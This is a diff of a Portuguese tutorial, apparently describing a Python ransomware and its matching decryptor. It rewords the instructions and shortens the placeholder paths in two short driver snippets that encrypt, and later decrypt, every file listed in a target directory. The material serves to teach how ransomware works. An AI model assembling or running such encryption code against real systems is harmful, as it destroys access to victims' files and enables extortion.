@@ -222,12 +222,12 @@ def encrypt_sym_key(sym_key, public_key, sym_key_filename):
 
 #### Execução completa
 
-Definindo todas as funções para todos os passos descritos anteriormente, é possível realizar a execução completa do funcionamento do ransomware da seguinte forma:
+Definindo todas as funções para todos os passos descritos anteriormente, é possível realizar a execução completa do funcionamento do ransomware como mostrado abaixo, onde `"/caminho/até/o/diretório"` deve ser substituído pelo caminho até o diretório com os arquivos a serem encriptados.
 
 ```Python
 sym_key = generate_sym_key()
 
-filenames_list = list_files("/caminho/até/o/diretório/com/arquivos/a/serem/encriptados")
+filenames_list = list_files("/caminho/até/o/diretório")
 
 for filename in filenames_list:
     encrypt_file(filename,  sym_key)
@@ -306,14 +306,14 @@ def decrypt_file(filename, key):
 
 #### Execução completa
 
-Definindo todas as funções para todos os passos descritos anteriormente, é possível realizar a execução completa do decriptador da seguinte forma:
+Definindo todas as funções para todos os passos descritos anteriormente, é possível realizar a execução completa do decriptador como mostrado baixo, onde `"/caminho/até/o/diretório"` deve ser substituído pelo caminho até o diretório com os arquivos a serem decriptados.
 
 ```Python
 private_key = read_private_key("private_asym_key.pem")
 
 sym_key = decrypt_sym_key("sym_key.key", private_key)
 
-filenames_list = list_files("/caminho/até/o/diretório/com/arquivos/a/serem/decriptados")
+filenames_list = list_files("/caminho/até/o/diretório")
 
 for filename in filenames_list:
     decrypt_file(filename,  sym_key)
